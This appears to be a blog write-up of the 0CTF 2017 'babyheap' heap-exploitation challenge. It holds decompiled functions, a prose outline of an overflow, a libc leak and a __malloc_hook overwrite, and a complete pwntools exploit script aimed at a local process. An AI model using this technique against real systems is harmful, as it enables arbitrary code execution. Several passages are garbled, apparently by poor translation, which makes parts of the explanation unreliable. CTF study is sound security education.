---
title: "[0CTF 2017 Quals pwn] babyheap writeup"
published: 2026-06-21
description: An analysis of the 0CTF 2017 babyheap challenge and its exploitation strategy.
category: CTF
tags: [CTF, writeup, 0CTF2017]
draft: false
---

# 0CTF 2017 Quals pwn: babyheap
This article records an analysis of the `babyheap` challenge after an extended break from heap exploitation.

The problem area is pwn, and the flag format is flag{}.

## Static analysis
The initial inspection establishes the binary format and enabled mitigations.
```bash
file babyheap 
babyheap: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped

checksec --file=./babyheap
[*] '/home/bankai/testplace/babyheap'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

The menu and allocation interface identify this as a heap-exploitation challenge.

```bash
strings -tx./babyheap | grep GCC
   2010 GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
```
The embedded compiler string also identifies the intended environment. I had previously consulted an existing solution, so this exercise should be understood as reproduction and study rather than an independent solve.

For Ubuntu 16.04, I used a separate environment image to reproduce the relevant allocator behavior.

I began with Ghidra and later continued the analysis in `IDA Pro 9.3`.

## Recovered program structure

The following decompilation has been renamed and retyped to expose the relevant program structure.

```c
__int64 __fastcall main(char *a1, char **a2, char **a3)
{
  Chunk *chunks; // [rsp+8h] [rbp-8h]

  chunks = (Chunk *)custom_heap_init();         // custom heap ASLR
  while ( 1 )
  {
    print_menu();                               // menu
    switch ( get_input() )
    {
      case 1LL:
        Allocate(chunks);
        break;
      case 2LL:
        Fill((__int64)chunks);
        break;
      case 3LL:
        Free((__int64)chunks);
        break;
      case 4LL:
        Dump((__int64)chunks);
        break;
      case 5LL:
        return 0;                               // exit
      default:
        continue;
    }
  }
}
```

This is the standard menu structure for a heap challenge.

```bash
===== Baby Heap in 2017 =====
/dev/urandom
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command:
```

With `strings`, I have already briefly looked at the menu strings.
take a quick look at `generation/replenishment/clear/dump/`.

### Allocate
```c
void __fastcall Allocate(Chunk *a1)
{
  int i; // [rsp+10h] [rbp-10h]
  int input; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if (!a1[i].in_use )
    {
      printf("Size: ");
      input = get_input();
      if ( input > 0 )
      {
        if ( input > 4096 )
          input = 4096;
        v3 = calloc(input, 1u);
        if (!v3 )
          exit(-1);
        a1[i].in_use = 1;
        a1[i].size = input;
        a1[i].ptr = v3;
        printf("Allocate Index %d\n", i);
      }
      return;
    }
  }
}
```
`Allocate` cowardly uses **calloc**. In other words, it is impossible for the first person to make it to be Ricked.
Up to 4096 bytes can be allocated, and `in_use`, `size`, and `ptr` are used.

The allocator is custom, but that distinction does not affect the immediate control-flow analysis.

### Fill
```c
void __fastcall Fill(Chunk *a1)
{
  unsigned int input; // [rsp+18h] [rbp-8h]
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  input = get_input();
  if ( input < 0x10 && a1[input].in_use == 1 )
  {
    printf("Size: ");
    v2 = get_input();
    if ( v2 > 0 )
    {
      printf("Content: ");
      read_byte2((__int64)a1[input].ptr, v2);
    }
  }
}
```

The maximum number of chunks is `0x10`, up to 16.
`size` The inspection is thorough, but there is no limit to tq size? There was a time to make it...

### Free
```c
void __fastcall Free(Chunk *a1)
{
  unsigned int input; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  input = get_input();
  if ( input < 0x10 && a1[input].in_use == 1 )
  {
    a1[input].in_use = 0;
    a1[input].size = 0;
    free(a1[input].ptr);
    a1[input].ptr = nullptr;
  }
}
```

It is a standard implementation. As if anyone would say that.
Whether to release or not is determined by checking the index and the `in_use` flag.
At this point, the pointer transition indicates that the allocator invariant can be violated.

### Dump
```c
void __fastcall Dump(Chunk *a1)
{
  unsigned int idx; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  idx = get_input();
  if ( idx < 0x10 && a1[idx].in_use == 1 )
  {
    puts("Content: ");
    write_out(a1[idx].ptr, a1[idx].size);
    puts(byte_14F1);
  }
}
```
Same verification, and output as `write_out`.

## Start Legend Ex
all the information you need has been given. What are you hesitating about?
Is the code long? no.
Are there complex formulas? no.
The remaining technique is standard heap exploitation against `glibc 2.23`.

This was a long story, let me finish it quickly.

Find the evidence yourself,
Although not mentioned, the `mmap` metadata array friend is one to whom **ASLR** is applied once more.
You can clearly see that they are aiming for `libc`. it is just like that..

First, prepare about **4** chunks (0, 1, 2, 3),
Chunk 0 overflow -> Chunk 1 size manipulation
If you release this large number 1 (0x120) as `free`, it will go to `unsorted bin`.
But he gets assigned? it is split in half, so it is normal at 1, but the back part is at `unsorted bin`.
If you look it up twice, you can just read `fd`.

This is `main_arena+0x58`, so just subtract the mapping address of `libc` to get the offset.
If you are given a Rick, you can use this to decide `libc_base`.

The recovered base address makes a call to `system` feasible.
Nope nope. There is no stack bof and no return address **primitive**.

So we have to find a suitable cost price.
The direct strategy is to overwrite `__malloc_hook` and trigger the corresponding allocation path.

I'll just download Excode and be done with it...but shouldn’t we cover `__free_hook` as well?

Please take care of this.

---
# EXPLOIT

```python
from pwn import *

context.binary = elf = ELF('./babyheap')
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

HOST = "localhost"
PORT = 1337

def menu(option):
	p.sendlineafter(b'Command: ', str(option).encode())

def alloc(size):
	menu(1)
	p.sendlineafter(b'Size: ', str(size).encode())

def fill(idx, data):
	menu(2)
	p.sendlineafter(b'Index: ', str(idx).encode())
	p.sendlineafter(b'Size: ', str(len(data)).encode())
	p.sendlineafter(b'Content: ', data)

def free(idx):
	menu(3)
	p.sendlineafter(b'Index: ', str(idx).encode())

def dump(idx):
	menu(4)
	p.sendlineafter(b'Index: ', str(idx).encode())
	p.recvuntil(b'Content: \n')
	return p.recvline()

p = process()
#p = remote(HOST, PORT)
#gdb.attach(p)

def slog(n, a): return success(": ".join([n, hex(a)]))

alloc(0x80)
alloc(0x80)
alloc(0x80)
alloc(0x80)
pause()

fill(0, b'A'*0x80 + p64(0) + p64(0x121))
pause()

free(1)
pause()

alloc(0x80)
pause()

leak = u64(dump(2)[:8])
slog("leak", leak)

lb = leak - 0x3c4b78
slog("libc_base", lb)

libc.address = lb
malloc_hook = libc.sym["__malloc_hook"]
slog("malloc_hook", malloc_hook)


og = lb + 0x4526a
slog("working one_gadget", og)

# carve 0x70 from 0x90 unsorted bin chunk
alloc(0x60)

# free that
free(4)
pause()

fill(2, p64(malloc_hook-0x23))

alloc(0x60)
alloc(0x60)

fill(5, b'\x00'*0x13 + p64(og))

p.sendlineafter(b'Command: ', b'1')
p.sendlineafter(b'Size: ', b'1')

p.interactive()
```

I adjusted it appropriately to suit the environment.
In conclusion,

Why have not I posted here before now?
The answer is simple. Because it did not go as planned as I thought.

`CTF` albums that have been released so far
It will be added and posted here.

The exercise identified several allocator details that require further study, which is a useful outcome of the reproduction.
